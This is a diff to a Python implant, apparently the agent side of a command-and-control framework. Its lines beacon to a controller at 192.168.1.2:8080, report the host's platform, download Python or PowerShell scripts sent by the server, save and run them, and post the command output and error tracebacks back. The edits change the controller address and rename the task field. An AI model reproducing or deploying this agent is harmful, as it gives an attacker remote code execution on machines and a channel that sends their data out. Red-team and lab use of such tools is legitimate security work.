@@ -15,7 +15,7 @@ from os.path import isfile, join
 
 
 def staging(identifier):
-	url = 'http://192.168.19.136:8080/stage_0'
+	url = 'http://192.168.1.2:8080/stage_0'
 	cookies = {'session': base64.b64encode(identifier.encode("ascii")).decode("ascii")}
 	os_info = {'platform': platform.system(), 'version': platform.release()}
 	r = requests.post(url = url,cookies = cookies, data = os_info)
@@ -24,7 +24,7 @@ def staging(identifier):
 ## Send out beacons for 60secs at 5secs interval
 def beacon(identifier):
 	start_time = time.time()
-	url = 'http://192.168.19.136:8080'
+	url = 'http://192.168.1.2:8080'
 
 	while True:
 
@@ -54,10 +54,10 @@ def handle_commands(response, identifier):
 
 		## Script save to file as per language
 		if language == 'python':
-			save_path = join(dump_dir,res['cmd']+".py")
+			save_path = join(dump_dir,res['command']+".py")
 		else:
 			## Powershell
-			save_path = join(dump_dir,res['cmd']+".ps1")
+			save_path = join(dump_dir,res['command']+".ps1")
 
 		f = open(save_path, "w+")
 		f.write(res['script'])
@@ -69,7 +69,7 @@ def handle_commands(response, identifier):
 			if language == 'python':
 				## The dump directory is to be added to os path as python looks there for requires in case not in current directory
 				sys.path.append(os.path.abspath(dump_dir))
-				file =  __import__(res['cmd'])
+				file =  __import__(res['command'])
 
 				command_output = file.execute_command()
 			else:
@@ -80,7 +80,7 @@ def handle_commands(response, identifier):
 		## TODO - Add command successful or not?
 		## Send the command output back to server
 		if command_output:
-			url = 'http://192.168.19.136:8080/'+res['cmd']+'/output/'+res['task_id']
+			url = 'http://192.168.1.2:8080/'+res['command']+'/output/'+res['task_id']
 			cookies = {'session': base64.b64encode(identifier.encode("ascii")).decode("ascii")}
 
 			r = requests.post(url = url,cookies = cookies, data = command_output)
@@ -89,7 +89,7 @@ def handle_commands(response, identifier):
 			pass
 	except:
 		## Some error happened while handling commands, sent the traceback to server back
-		url = 'http://192.168.19.136:8080/'
+		url = 'http://192.168.1.2:8080/clienterror'
 		cookies = {'session': base64.b64encode(identifier.encode("ascii")).decode("ascii")}
 		r = requests.post(url = url,cookies = cookies, data = traceback.format_exc())
 
